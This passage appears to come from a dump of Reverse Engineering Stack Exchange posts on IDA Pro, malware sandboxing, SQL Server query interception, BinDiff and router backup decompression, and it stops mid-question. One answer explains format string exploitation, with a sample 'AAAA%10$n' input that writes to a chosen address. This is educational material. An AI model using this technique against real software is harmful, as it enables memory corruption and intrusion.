<p>If ASM is a problem for you.. IdaPro can probably help showing a sort of pseudocode, that is not exactly like the original source code, but it can give you an idea about the CodeFlow </p>
","12029"
"Recompile the asm file IDA pro created","3485","","<p>currently I am trying to use IDA pro to <strong>generate assembly code from PE file and recompile it</strong>.</p>

<h3>Firstly</h3>

<p>basically I know this way:</p>

<pre><code>File -&gt; Produce File -&gt; Create ASM File
</code></pre>

<p>and it seems the asm file it generated cannot be directly recompile.</p>

<h3>Second</h3>

<p>use some IDC or Python script in the IDA to extract useful asm instructions, put them together in order and recompile,
this kind of solution can be seen from some academic paper, but non of them have given some detailed instructions about how to do this task...</p>

<p>Could anyone give me some instructions about this issue..? 
Thank you!</p>
","<p>Many years ago I wrote a very crude script to dump the current (as defined by cursor location) function to the output window using mostly nasm compatible syntax. You could potentially modify to save output to a file and iterate over every function in your database. The script is available here: <a href=""http://www.idabook.com/scripts/generate_nasm.idc"">nasm dumper</a></p>
","3562"
"Searching for a sequence of instructions in IDA Pro","3476","","<p>How can I search for a sequence of instructions in IDA Pro? </p>

<p>I did manage to search for a single instruction using text search string <code>li.*r4.*-1</code> (for instruction <code>li r4, -1</code>), but I failed to match multiple instructions or newline character. </p>

<p>It seems to be possible to this by using the binary search, but this requires converting the assembly to the corresponding binary opcodes. </p>
","<p>If you have a fixed set of instructions you are search for eg:</p>

<pre><code>li  r4,0
li  r5,16
li  r6,32
</code></pre>

<p>Assuming you already have one location found, you can look in the binary hex view, and find the byte pattern you want and use that in a binary search, just make sure you write each byte with a space between them like <code>01 02 03 04</code> so IDA treats them as a sequence of bytes, not as a word/int type search.</p>

<p>If you have a regex like soft match like</p>

<pre><code>slwi r0,r3,2
add r4,r4,r0
</code></pre>

<p>but you don't know <code>r4</code> will be the register used, but know it will be this pattern of <code>slwi</code> and <code>add</code> then I'd write a script (IDC or python) that searches using a text search for outer clause, and then checks for the next instruction to match the expected test, or move to next outer clause.</p>

<p>So the following idc file/code does the outer loop (I was using it to find address offsets that where not set to references), but it might be a good starting base to work from</p>

<pre><code>#include &lt;idc.idc&gt;

static fixAllOffsets( strtext)
{
    auto ea, offset;
    auto last;
    Message(""Start\n"");
    ea = FindText(0x100000, SEARCH_DOWN | SEARCH_REGEX, 0, 0, strtext);
    last = 0;
    while( ea != BADADDR &amp;&amp; ea != last)
    {
        Message(""%a\n"", ea);

        // INSERT you next line checks here

        last = ea;
        ea = FindText(ea+6, SEARCH_DOWN | SEARCH_REGEX, 0, 0, strtext);
    }
    Message(""End\n"");
}

static main() 
{
    fixAllOffsets( ""0x9[EF][0-9A-F][0-9A-F][0-9A-F][0-9A-F][0-9A-F][0-9A-F]"" );
}
</code></pre>
","8922"
"Where can I find CrackMes for beginners?","3450","","<p>I'm interested in learning. Where can I find CrackMes for beginners? Especially ones with answers.</p>
","<p>Try these two links, they are full of resources : </p>

<ol>
<li><a href=""https://johannesbader.ch/projects/solutions-to-crackmes/"" rel=""nofollow noreferrer"">https://johannesbader.ch/projects/solutions-to-crackmes/</a></li>
<li><a href=""https://tuts4you.com/download.php?list.61"" rel=""nofollow noreferrer"">https://tuts4you.com/download.php?list.61</a></li>
</ol>
","14212"
"How can I analyze a potentially harmful binary safely?","3449","","<p>I've recently managed to isolate and archive a few files that managed to wreak havoc on one of my client's systems. So I was wondering what software and techniques make the best sandbox for isolating the code and digging into it to find out how it works.</p>

<p>Usually, up to this point in time I would just fire up a new VMWare or QEMU instance and dig away, but I am well aware that some well-written malware can break out of a VM relatively easily. So I am looking for techniques (Like using a VM with a different emulated CPU architecture for example.) and software (Maybe a sandbox suite of the sorts?) to mitigate the possibility of the code I am working on ""breaking out"".</p>

<p>What techniques do you recommend? What software do you recommend?</p>
","<p>The title mentions ""sandbox"" but VMWare or QEMU is usually not called that, so the question seems to be more about ""how do I analyze it without a danger of infection?""</p>

<p>There are three broad categories of tools and approaches you could take here.</p>

<h1>1. User-mode sandboxes</h1>

<p>A user-mode sandbox basically runs the sample being investigated but intercepts all or at least the most critical APIs that access the host OS, neutralizes them and modifies the results to fool the software into thinking it's running all alone. One of the most popular such tools seems to be <a href=""http://www.sandboxie.com/"">Sandboxie</a>, but there exist others such as <a href=""http://code.google.com/p/pyboxed/"">PyBox</a>. Usually can be detected by the malware pretty easily and there's always a danger that an unemulated API will let the code to run amok.</p>

<h1>2. Virtual machines and emulators</h1>

<p>These go a bit deeper and try to emulate not only APIs but execution of the actual code. As well, usually you need to run a full OS inside the emulator and can't use the host OS as is (could be an advantage or disadvantage depending on your goals). These can be further subdivided in three categories by approach used for emulation:</p>

<h3>a)  virtualization</h3>

<p>These include VMWare, VirtualBox and VirtualPC. They use virtualization features of the recent processors to run most of the code natively and only emulate memory or hardware accesses. This makes them fast but in theory can lead to code escaping the VM in case of implementation bugs.</p>

<h3>b) dynamic translation</h3>

<p>This approach is used by QEMU. It translates each basic block into a sequence of native CPU's instructions and executes that. This approach allows it to reasonably fast emulate many different architectures, however the timing may differ quite a lot from the original. I don't think I've heard of any VM escaping bugs but it's possible to detect it.</p>

<h3>c) full emulation</h3>

<p>This is used by Bochs. It fully emulates each separate instruction one by one, as they're being executed. This makes it somewhat slower than other solutions but allows it to achieve almost perfect emulation of even the most low-level details. It's also probably the safest regarding to VM escaping bugs. There were some implementation bugs that could be used to detect it but I think most of them have been fixed.</p>

<h1>3. Static analysis</h1>

<p>The best way to avoid the break out is to not run the code at all! Also, static analysis allows you to look at the complete code of the binary and see all of it, even the code paths which are not taken by running it and you sidestep all runtime checks and detections.</p>

<p>Unfortunately, static analysis can be hampered by packing or obfuscation used in the malware. So it's often necessary to combine several approaches. I'm not a professional analyst, but I do dabble in some malware analysis. My workflow usually goes like this:</p>

<ol>
<li>Open sample in IDA.</li>
<li>if it looks packed or encrypted, use <a href=""https://hex-rays.com/video/bochs_video_1.html"">Bochs debugger</a> to emulate its execution and let it unpack itself. </li>
<li>When it's finished (usually it's obvious), I take a memory snapshot, stop debugging, and continue analysis statically.</li>
<li>If the unpacked code contains another embedded file (pretty common situation), saved it into a separate file and go to step 1</li>
</ol>
","30"
"Server-side Query interception with MS SQL Server","3415","","<p>I'm researching into intercepting queries that arrive at the SQL Server 2008 process.</p>

<p>SQLOS architecture is divided in the following system DLLs:</p>

<ul>
<li><strong>sqlmin.dll</strong>: Storage, replication, security features,etc.</li>
<li><strong>sqllang.dll</strong>: TransactSQL query execution engine, expression evaluation, etc.</li>
<li><strong>sqldk.dll</strong>: Task scheduling and dispatch, worked thread creation, message loops, etc.</li>
</ul>

<p><em>SQLSERVR</em> service process instances the SQLOS components through <em>sqlboot.dll</em> and <em>sqldk.dll</em>, and the worker threads receive queries through the selected connection method in the server (TCP/IP, local shared memory or named-pipes).</p>

<p>I've debugged the sqlservr.exe process address space searching for textual queries. It seems that query strings are readable, but I could not find a point where queries can be intercepted while they enter the SQLOS scheduler.</p>

<p>Listening to pipes or TCP/IP is not an option at this moment; I would like to inject at a higher level, preferably at SQLOS-component level.</p>

<p>Any idea on where to start looking into? </p>
","<p>This seemed like a fun project for a Sunday afternoon, so I had a go at it. To get straight to the point, here's the call stack for a function in SQL server that parses and then executes the query (addresses and offsets taken from SQL Server 2008 R2 running on Windows 7 SP1 32-bit):</p>

<pre><code>0x7814500a msvcr80.i386!memcpy+0x5a
0x013aa370 sqlservr!CWCharStream::CwchGetWChars+0x5c
0x013a9db5 sqlservr!CSQLStrings::CbGetChars+0x35
0x012ffa50 sqlservr!CParser::FillBuffer+0x3d
0x0138bbfd sqlservr!CParser::CParser+0x3c8
0x01352e96 sqlservr!sqlpars+0x7b
0x013530f2 sqlservr!CSQLSource::FParse+0x16d
0x013531ed sqlservr!CSQLSource::FParse+0x268
0x012ff9e8 sqlservr!`string'+0x3c
0x015894b8 sqlservr!CSQLSource::Execute+0x2c8
0x0158ad31 sqlservr!process_request+0x2ac
0x0158a328 sqlservr!process_commands+0x15f
0x015cf8b4 sqlservr!SOS_Task::Param::Execute+0xdd
0x015cf9ea sqlservr!SOS_Scheduler::RunTask+0xb4
0x015cf575 sqlservr!SOS_Scheduler::IsShrinkWorkersNecessary+0x48
0x77f06854 ntdll!ZwSignalAndWaitForSingleObject+0xc
0x77e479e2 kernel32!SignalObjectAndWait+0x82
</code></pre>

<p>Based on this, you probably want to take a close look at the <code>CSQLSource</code> class, and particularly its <code>Execute</code> method.</p>

<p>Armed with this information, I was also able to dig up a couple <a href=""http://blogs.msdn.com/b/askjay/archive/2010/10/03/how-do-i-find-what-queries-were-executing-in-a-sql-memory-dump.aspx"">blog posts</a> by someone at Microsoft on how to extract the query string from a memory dump of SQL Server. That post seems to confirm that we're on the right track, and gives you a place to interpose and a way to extract the query string.</p>

<h1>Methodology</h1>

<p>I felt like this would be most easily tackled using some form of Dynamic Binary Instrumentation (DBI); since we suspect the query string will be processed somewhere in the SQL Server process, we can look at memory reads and writes made by the process, searching for a point that reads or writes the query string. We can then dump the callstack at that point and see what interesting addresses show up, and map them back to symbols (since, as Rolf points out, SQL Server has debug symbols available). It really was basically as simple as that!</p>

<p>Of course, the trick is having something around that lets you easily instrument a process. I solved this using a (hopefully soon-to-be-released) whole-system dynamic analysis framework based on <a href=""http://wiki.qemu.org/Main_Page"">QEMU</a>; this let me avoid any unpleasantness involved in getting SQL Server to run under, e.g., <a href=""http://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool"">PIN</a>. Because the framework includes record and replay support, I also didn't have to worry about slowing down the server process with my instrumentation. Once I had the callstack, I used <a href=""https://code.google.com/p/pdbparse/"">PDBParse</a> to get the function names.</p>
","1778"
"What Linux software can I use to explore entropy of a file?","3399","","<p>I've heard of <a href=""http://gynvael.coldwind.pl/?id=158"">tools</a> that could be used to graph entropy of a file. Is there a graphical Linux program that I could use for this job that would let me conveniently explore which blocks of a file have certain entropy patterns that could suggest compressed or encrypted data?</p>
","<p>You could use the #entropy command <a href=""http://rada.re"" rel=""nofollow"">radare2</a>. <a href=""http://binwalk.org"" rel=""nofollow"">binwalk</a> can calculate entropy, too.</p>

<h2>Radare2</h2>

<p>From the manual page of Radare2:</p>

<pre><code> #[hash]     Calculates the sha1, sha256, sha384, sha512, par, xor,
             xorpair, hamdist, mod255, crc16, crc32, md4, md5, entropy of
             the current block from the selected seek
</code></pre>

<p>So, using this command is as follow:</p>

<pre><code>$ radare2 /bin/ls
[0x00404890]&gt; #entropy
5.338618
</code></pre>

<h2>Binwalk</h2>

<p>If you get binwalk from the <a href=""https://github.com/devttys0/binwalk"" rel=""nofollow"">original Github project</a>, you will also grad a few <a href=""https://github.com/devttys0/binwalk/tree/master/src/binwalk/modules"" rel=""nofollow"">Python modules</a>, one of these is computing the <a href=""https://github.com/devttys0/binwalk/blob/master/src/binwalk/modules/entropy.py"" rel=""nofollow"">entropy of the analyzed file</a>.</p>

<p>Get these modules and run it on your file.</p>
","5927"
"What tools are available to trace system resources a program is touching in windows?","3360","","<p>What is the best tool to trace system resources a program is touching. For example, which registry keys, other files or DLLs it's loading, internet connections it's opening, etc...?</p>

<p>I saw this question on reddit.com/r/ReverseEngineering and the mod had said it would be an excellent question for SE. After searching, I can't find a similar question asked.</p>

<p>So, what tool do you use/recommend for tracing system resources a program touches in the context of Windows 7/8?</p>
","<blockquote>
  <p><strong><a href=""http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx"" rel=""nofollow"">Process Monitor</a></strong>
  <br>Process Monitor is an advanced monitoring tool for Windows that shows real-time file system, Registry and process/thread activity.</p>
</blockquote>

<p><p></p>

<blockquote>
  <p><strong><a href=""http://msdn.microsoft.com/en-us/library/windows/hardware/hh162945.aspx"" rel=""nofollow"">Windows Performance Toolkit</a></strong>
  <br>The Windows Performance Toolkit (WPT, or xperf) is a free toolset from Microsoft that lets you see everything happening on your system in order to investigate otherwise invisible performance problems in your game. WPT can show Disk IO, registry access, GPU packets, page faults, context switches, kernel activity, and even has a sampling profiler, all integrated into one visualizer.</p>
</blockquote>

<p><p></p>

<blockquote>
  <p><strong><a href=""http://www.rohitab.com/apimonitor"" rel=""nofollow"">API Monitor</a></strong>
  <br>API Monitor is a free software that lets you monitor and control API calls made by applications and services. Its a powerful tool for seeing how applications and services work or for tracking down problems that you have in your own applications.</p>
</blockquote>

<p><p></p>

<blockquote>
  <p><strong><a href=""http://www.nektra.com/products/spystudio-api-monitor/"" rel=""nofollow"">SpyStudio</a></strong> 
  <br>SpyStudio shows and interprets calls, displaying the results in a structured way which is easy for any IT professional to understand. SpyStudio can show registry keys and files that an application uses, COM objects and Windows the application has created, and errors and exceptions</p>
</blockquote>
","8043"
"Are there any ARM disassemblers that provide structured output?","3356","","<p>Are there any ARM (or other non-x86) disassemblers that decompose an instruction into its component parts in a machine-friendly structure? Ideally it would be something like <a href=""http://www.cs.virginia.edu/kim/publicity/pin/docs/20751/Xed/html/"" rel=""nofollow"">XED</a> or <a href=""https://code.google.com/p/distorm/"" rel=""nofollow"">distorm3</a>, which disassemble into a structure and then provide an API for querying things like ""Is this a call?"" ""Is this a conditional branch?"" etc., or getting the operands of an instruction.</p>

<p>I found <a href=""https://code.google.com/p/armstorm/"" rel=""nofollow"">armstorm</a>, but it currently only supports THUMB.</p>

<p>Edit: To clarify, I'm looking for something that can be called from within another program and hopefully has liberal licensing (GPL-compatible).</p>
","<p><a href=""https://github.com/jbremer/darm"">DARM</a> (GitHub) by Jurriaan Bremer is an ARMv7 disassembler written in C and is available under a 3-Clause BSD License.</p>

<p>Note: It currently does not support Thumb mode.</p>

<p>A simple example of using DARM could be as follows:</p>

<pre><code>// The structure which will hold all the metadata about the disassembled instruction...
darm_t d;

// disassemble a 32bit opcode...
if( darm_armv7_disasm( &amp;d, 0xE12FFF14 ) &gt;= 0 )
{
    if( d.instr == I_BX )
    {
        // do something with a BX instructiuon...
    }

    // print the disassembled full instruction 
    darm_str_t str;
    if( darm_str( &amp;d, &amp;str) &gt; 0 )
        printf( ""%s\n"", str.instr );
}
</code></pre>
","1793"
"How does BinDiff work?","3332","","<p>I would like to know what are the basic principles (and maybe a few things about the optimizations and heuristics) of the <a href=""http://www.zynamics.com/bindiff.html"">BinDiff software</a>. Does anyone have a nice and pedagogic explanation of it?</p>
","<p>In general, BinDiff in its current version as of this writing (4.x) works by matching attributes on the function level. 
Basically, matching is divided into two phases: first initial matches are generated which are then refined in the drill down phase.</p>

<h2>Initial Matches</h2>

<p>First of all BinDiff associates a signature based on the following attributes to each function:</p>

<ul>
<li>the number of basic blocks</li>
<li>the number of edges between those blocks</li>
<li>the number of calls to subfunctions</li>
</ul>

<p>This step gives us a set of signatures for each binary which in turn are used to generate the set of initial matches. Following a one-to-one relation, BinDiff selects these initial matches based on the above characteristics.</p>

<p>The next step tries to find matchings on the call graph of each binary: for a verified match, the set of called functions from the matched function is examined in order to find event more matches. This process is repeated as long as new matches are found.</p>

<h2>Drill Down</h2>

<p>In practice, not all functions will be matched by the one-to-one relation induced by the initial matching strategy, so after the initial matchings have been determined we still have a list of unmatched functions.
The idea of the drill down phase is to have multiple different function matchings strategies which are applied until a match is found. The order of applying these strategies is important: BinDiff tries those strategies for which it assumes the highest confidence, first. Only if no match could be found, it goes on with the next strategy. This is repeated until BinDiff runs out of strategies, or until all functions are matched. Examples include MD index, match based on function names (i.e. imports), callgraph edges MD index, etc.</p>

<p><a href=""https://www.sto.nato.int/publications/STO%20Meeting%20Proceedings/RTO-MP-IST-091/MP-IST-091-26.pdf"" rel=""nofollow noreferrer"">MD-Index paper</a></p>

<p><a href=""http://static.googleusercontent.com/external_content/untrusted_dlcp/www.zynamics.com/en//downloads/bindiffsstic05-1.pdf"" rel=""nofollow noreferrer"">Graph-based Comparison of Executable Objects</a></p>

<p><a href=""http://static.googleusercontent.com/external_content/untrusted_dlcp/www.zynamics.com/en//downloads/dimva_paper2.pdf"" rel=""nofollow noreferrer"">Structural Comparison of Executable Objects</a></p>

<p>(Disclaimer: working @ team zynamics / google, hopefully I didn't mess up anything, otherwise soeren is going to grill me ;-))</p>
","1511"
"64-bit integers on 32-bit machines","3316","","<p>Let's say I create a program in C like this and compile it on a regular 64-bit desktop machine:</p>

<pre><code>#include &lt;stdint.h&gt;

int main(void)
{
    uint64_t a = 0x12345679abcdefULL;
    uint64_t b = 0xfdcba987654321ULL;
    uint64_t c = a + b;
    return 0;
}
</code></pre>

<p>I just tested the code using <code>gcc -O0 -S</code>. It seems to allocate two 32-bit values on the stack and add then with <code>addl</code> and <code>adcl</code> separately. This happens for both <code>-m32</code> and <code>-m64</code> switch, even though I am on a 64-bit machine, and there indeed seem to be a dedicated instruction set for 64-bit integers, including operations such as <code>movq</code> and <code>addq</code>.</p>

<ol>
<li><p>Why did <code>gcc</code> produce code like for a 32-bit machine even if I told it to use 64-bit arithmetic with <code>-m64</code>?</p>

<pre><code>&gt;uname -a
CYGWIN_NT-6.2-WOW work 1.7.35(0.287/5/3) 2015-03-04 12:07 i686 Cygwin

&gt;gcc --version
gcc (GCC) 4.9.2
</code></pre></li>
</ol>

<p>Now, let's say I'm on a 32-bit machine and I operate on 64-bit integers.</p>

<ol start=""2"">
<li><p>The program allocated two 32-bit variables <strong>on the stack</strong>. Is this part of a C/C++ standard, or is allocating them on the heap to be expected with some compilers (because they try to fit a 64-bit integer into a 32-bit stack in a different way)?</p></li>
<li><p>If I put <code>movq</code> in a program designed for a 32-bit machine, will the desired behavior be emulated, or will the instruction be misunderstood?</p></li>
</ol>
","<h2><strong>1:</strong></h2>

<p>See the <strong>Immediates</strong> section on <a href=""http://www.x86-64.org/documentation/assembly.html"" rel=""nofollow"">this 64 bit assembly reference</a>.</p>

<blockquote>
  <p>Immediate values inside instructions remain 32 bits and their value is sign extended to 64 bits</p>
</blockquote>

<p>There just isn't an instruction to move a 64 bit immediate value to <em>memory</em> (*). And because it can be emulated nicely by moving two chunks of 32 bit, there was no reason to introduce new 64 bit instructions. (They could have changed the immediate <code>mov</code>s to always use 64 bits. But considering that most constants you'll ever use are &lt;= 2^31, using 32 bit only saves a lot of space for the upper zero bytes, and costs a bit when you actually use larger constants, so this saves memory).</p>

<p>(*) However, there are instructions to move a 64 bit immediate value to the 64 bit registers, because you can't access the high 32 bit in registers, opposed to memory.</p>

<p>I don't know why your program produced separate addl/adcl instructions; this is what i got from your program:</p>

<pre><code>    pushq   %rbp
    movq    %rsp, %rbp
    movl    $2041302511, -24(%rbp)
    movl    $1193046, -20(%rbp)
    movl    $-2023406815, -16(%rbp)
    movl    $16632745, -12(%rbp)
    movq    -16(%rbp), %rax
    movq    -24(%rbp), %rdx
    leaq    (%rdx,%rax), %rax
    movq    %rax, -8(%rbp)
    movl    $0, %eax
    leave
    ret
</code></pre>

<p>As you can see, the <code>leaq    (%rdx,%rax), %rax</code> adds 64 bit numbers all right. This was a gcc 4.4.7 on a RHEL 6.6 64 bit system. Please, always state your compiler and OS version, as the output may be quite dependent on those.</p>

<h2><strong>2:</strong></h2>

<p>As long as you're dealing with an x86/amd64 architecture, you can probably rely on local variables being put on the stack, and global variables not on the stack. But please note the concept of 'stack' and 'heap' aren't as clearly defined as it would seem. The <code>brk/sbrk</code> mechanism of allocating memory is deprecated; modern implementations use <code>mmap</code>. This might mean you have several small heaps in different sections of your address space. On ARM and MIPS, there's no stack pointer at all - there's just a convention that one specific register serves as the stack pointer, but the instructions to push/pop would work with other registers as well(*). In theory, the compiler is free to do a <code>mmap()</code> at the start of each function to allocate local memory, and <code>munmap()</code> it at the end of the function. The only thing the compiler <em>must</em> do is not keep the memory allocated (for reasonable definitions of allocated) after the function exits.</p>

<p>(*) This is a bit of an oversimplification but demonstrates the concept.</p>

<p>Of course, the idea of using <code>mmap()</code> to make space for local variables is an extreme example, that <em>probably</em> noone uses. But lots of compilers put local variables into processor registers and never reserve space on the stack for them (if you never use a pointer to them, and on architectures that aren't as register-starved as x86). Many architectures use processor registers for function arguments as well. And i've seen microcontroller C compilers that allow you to put all variables local to a function into a static area, if you use a certain keyword so the compiler knows the function isn't called recursively. So, while most of the time, local variables will be placed on the stack, you shouldn't assume this is carved in stone.</p>

<h2><strong>3.</strong></h2>

<p>The instruction will be misunderstood. The processor can be in 32 bit or 64 bit mode, and the same instructions (in the meaning of: the same sequence of instruction bytes) have different meanings in each of them. For example, <code>48 89 43 ec</code> is <code>mov [rbx-20],rax</code> in 64 bit mode, but <code>dec eax; mov DWORD PTR [ebx-0x14],eax</code> in 32 bit mode.</p>
","8455"
"how to setup IDA pro linux server","3279","","<p>I have Ubuntu 14.04 x64 and I am running Ida pro V6.6 in virtual box in windows 8 ... currently I want to debug some Linux elf's using Ida either via IDA linux remote server or gdbserver but I don't know how to set up such thing (remember Linux is the host and windows is the guest and IDA runs in windows)</p>
","<ol>
<li>Ensure that networking is enabled on the guest system and that it can communicate via TCP/IP with the host system.</li>
<li>Copy <code>&lt;IDA installation directory&gt;\dbgsrv\linux_serverx64</code> to your host system and run it.</li>
<li>Copy the target ELF binary to the guest system and load it into IDA (disassemble it).</li>
<li>In IDA (on the guest system), go to <code>Debugger → Select debugger...</code> in the menu bar and choose <code>Remote Linux debugger</code>.</li>
<li>In IDA (on the guest system), go to <code>Debugger → Process options...</code> in the menu bar and specify the hostname or IP of your host system, the debugging port used by <code>linux_serverx64</code>, and the debugging password (if you specified one when running <code>linux_serverx64</code>).</li>
<li>In IDA (on the guest system), select <code>Debugger → Start process</code> in the menu bar (or <code>Attach to process...</code> if the target is already running on the host system).</li>
</ol>

<p>Further references:</p>

<ul>
<li><a href=""https://www.hex-rays.com/products/ida/support/idadoc/1463.shtml"" rel=""nofollow"">https://www.hex-rays.com/products/ida/support/idadoc/1463.shtml</a></li>
<li><a href=""https://www.hex-rays.com/products/ida/debugger/cross-win-linux/win32tolinux.shtml"" rel=""nofollow"">https://www.hex-rays.com/products/ida/debugger/cross-win-linux/win32tolinux.shtml</a></li>
<li><a href=""https://www.hex-rays.com/products/ida/support/freefiles/remotedbg.pdf"" rel=""nofollow"">https://www.hex-rays.com/products/ida/support/freefiles/remotedbg.pdf</a></li>
</ul>
","11526"
"How can a format string vulnerability be used to write a specific string into memory?","3270","","<p>I think I understand how a format string vulnerability works, but what I have seen so far it can only be used to increase the value of an integer.</p>

<p>Can format string vulnerability also be used to write anything else?</p>

<p>And, by the way, are there languages, other then C and C++, that are at risk of creating such a vulnerability? How can I spot a format string vulnerability if I only have a binary?</p>
","<p>It's a lot of questions, here are a few answers:</p>

<h2>How can we write something in memory with a format string vulnerability ?</h2>

<p>For this, you need to know two specific features used in the <code>printf</code> format string specifications. First, <code>%n</code> is a format specifier that has the following effect (according to the manual page):</p>

<blockquote>
  <p><code>%n</code> The number of characters written so far is stored into the integer indicated by the <code>int *</code> (or variant) pointer argument. No argument is converted.</p>
</blockquote>

<p>Now, the second format string feature will allow us to select a specific argument from the format string. The main selection operator is <code>$</code>, and the following code means that we select the second argument (here the outcome will be to display <code>2</code>):</p>

<pre><code>printf(""%2$x"", 1, 2, 3)
</code></pre>

<p>But, in the general case, we can do <code>printf(""%&lt;some number&gt;$x"")</code> to select an arbitrary argument of the current <code>printf</code> function (format string argument does not count).</p>

<p>If we could pass the string <code>AAAA%10$n</code> to the program and make it appear as a format string, then we could write the value <code>4</code> to the address <code>0x41414141</code>.</p>

<p>So, format string bugs may offer a full access to the memory and you can decide what to write and where in the memory.</p>

<p>I really advise you to read ""<a href=""http://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf"">Exploiting Format String Vulnerabilities</a>"" from Scut (2001) to get a whole grasp on these kind of manipulations.</p>

<h2>Are they other languages than C/C++ that are vulnerable to these bugs ?</h2>

<p>Well, format string bugs are tied up to the <code>printf</code> function family and the way format strings may be passed to the function. It's a whole class of security issue itself. So, you might find ways to exploit similar problems in some other languages. Though, you may not find the exact same features as the format string capabilities in other languages may differ a lot.</p>

<p>I do think about languages such as Perl, Python, and so on, that all offer similar access to format string features.</p>

<h2>How can I spot format string vulnerabilities if I have only the binary ?</h2>

<p>First, you have to locate the calls to procedure of the <code>printf</code> family. Then, I would say that fuzz-testing (fuzzing) should be a good way to find the vulnerabilities. Especially if you can forge a few entries with seeds such as <code>AAAA%10$n</code>.</p>

<p>If you want a more accurate and exhaustive way to find it, you will probably need to do some binary analysis and taint analysis on every call to a procedure of the <code>printf</code> family.</p>
","4488"
"Is there an online service which provides the same functionalities as the Metasploit NASM shell?","3268","","<p>Does anyone know if there exists an online service which provides the same functionalities as the <a href=""https://github.com/Rendered79/metasploit/blob/master/tools/nasm_shell.rb"" rel=""nofollow"">Metasploit NASM shell</a> ?</p>

<p>Probably the above script can be ported to a standalone tool but I'm not very confident with Ruby, so if someone knows something already implemented, it will be helpful.</p>
","<p>There are several online tools providing a disassembling service. Here is a (non-exhaustive) list:</p>

<ul>
<li><a href=""http://www.onlinedisassembler.com/odaweb/"" rel=""nofollow"">ODAweb</a> (probably the most known);</li>
<li><a href=""http://pyms86.appspot.com/"" rel=""nofollow"">Pym's online disassembler</a>;</li>
<li><a href=""http://code.google.com/p/pvphp/"" rel=""nofollow"">PVPHP</a>;</li>
<li><a href=""http://udis86.sourceforge.net/"" rel=""nofollow"">Udis86</a>;</li>
<li><a href=""https://defuse.ca/online-x86-assembler.htm"" rel=""nofollow"">Defuse online x86 assembler</a> (a bit out-of-topic, but we never know).</li>
</ul>
","2680"
"RE Compressed backup file,router linux based so is it compresed with zlib?","3260","","<p>so I have backup from my router its zte zxv10h201l and its linux based but I can not identify type of compression of this file. 
Here is couple of first ""lines"" of it</p>

<pre><code>
00000000  99 99 99 99 44 44 44 44  55 55 55 55 aa aa aa aa  |....DDDDUUUU....|
00000010  00 00 00 00 00 00 00 00  00 00 00 04 00 00 00 00  |................|
00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 40  |...............@|
00000040  00 01 00 00 00 00 00 80  00 00 23 90 00 00 00 00  |..........#.....|
00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000080  04 03 02 01 00 00 00 00  00 00 00 0b 5a 58 56 31  |............ZXV1|
00000090  30 20 48 32 30 31 4c 01  02 03 04 00 00 00 00 00  |0 H201L.........|
000000a0  01 4c 54 00 00 23 78 00  00 20 00 40 34 b7 80 e9  |.LT..#x.. .@4...|
000000b0  80 47 c0 00 00 00 00 00  00 00 00 00 00 00 00 00  |.G..............|
000000c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000d0  00 00 00 00 00 20 00 00  00 03 d0 00 00 04 18 78  |..... .........x|
000000e0  da ed 58 61 53 da 30 18  fe be 5f c1 f1 03 b0 29  |..XaS.0..._....)|
000000f0  88 db 4e 77 07 6d d1 de  00 3b e8 64 b7 2f 5e 6c  |..Nw.m...;.d./^l|
00000100  23 e6 2c 49 2f 4d 11 f6  eb 97 da 56 0b da 34 45  |#.,I/M.....V..4E|
00000110  77 d3 13 94 2b 94 27 6f  9e be 79 f2 bc 6f 7b 6c  |w...+.'o..y..o{l|
00000120  f6 bf 7d 6a 88 d7 b1 7b  15 34 08 5c a0 93 a6 d9  |..}j...{.4.\....|
00000130  ef c3 08 35 1b 13 7a 67  d0 98 f0 93 26 68 a6 a0  |...5..zg....&h..|
00000140  7b a0 38 dd 18 d3 93 a6  56 38 79 ff 83 39 ca 02  |{.8.....V8y..9..|
00000150  d8 03 9b 5c d3 66 63 09  03 01 03 e2 4f 17 ef 8e  |...\.fc.....O...|
00000160  96 be 80 d6 d5 40 27 fd  a6 03 fd 30 3b 7d 98 fc  |.....@'....0;}..|
00000170  92 1e f5 ec d8 4e 8e cd  83 c2 dc 07 62 f2 8c ef  |.....N......b...|
</code></pre>

<p>Afer that I connected ttl-rs232 to router and when backup button is pressed on my router web UI this show up in log</p>

<pre><code>
=~=~=~=~=~=~=~=~=~=~=~= PuTTY log 2014.01.31 22:58:29 =~=~=~=~=~=~=~=~=~=~=~=
04:15:12 [webd][Info] [upload.c(1138)my_upload_file] Enter my_upload_file.
04:15:12 [webd][Info] [upload.c(1343)my_upload_file] Begin download file.(filetype : config)
04:15:12 [DB][Info] [dbc_mgr_file.c(1644)dbGetBinFile] DB get cfg start
04:15:12 [FLASHRW][Info] [proc_file_mod.c(1204)file_open] open file: /proc/cfg/db_user_cfg.xml
04:15:12 [FLASHRW][Info] [proc_file_mod.c(1334)file_close] close file: /proc/cfg/db_user_cfg.xml
04:15:12 [DB][Info] [dbc_mgr_file_en(570)dbcCfgFileIsEnc] FileIsEncry return 0
04:15:12 [FLASHRW][Info] [proc_file_mod.c(1204)file_open] open file: /proc/cfg/db_user_cfg.xml
04:15:12 [FLASHRW][Info] [proc_file_mod.c(1334)file_close] close file: /proc/cfg/db_user_cfg.xml
04:15:12 [DB][Info] [dbc_mgr_file_si(198)dbcCfgFileSign] SignFile return 0
04:15:12 [DB][Info] [dbc_mgr_file_ve(277)dbcCfgFileVersi] add FileVersion return 0
04:15:12 [DB][Warn] [dbc_mgr_file.c(1708)dbGetBinFile] DB download cfg(iRet:0)
04:15:12 [webd][Info] [upload.c(644)create_config_f] user cfg path:/var/tmp/version-cfg
</code></pre>

<p>So I searched router firmware for srings of text like above and found this line</p>

<blockquote>
  <p>deflate 1.1.4 jean loup gailly</p>
</blockquote>

<p>nearby some of strings, after quick google it seams that this is zlib and its used for compression of ""something"", after that with my little knowlage I tried to decompress it with comands like this </p>

<blockquote>
  <p>printf ""\x1f\x8b\x08\x00\x00\x00\x00\x00"" |cat - zlib.raw |gzip -dc</p>
  
  <p>cat /tmp/data | openssl zlib -d</p>
</blockquote>

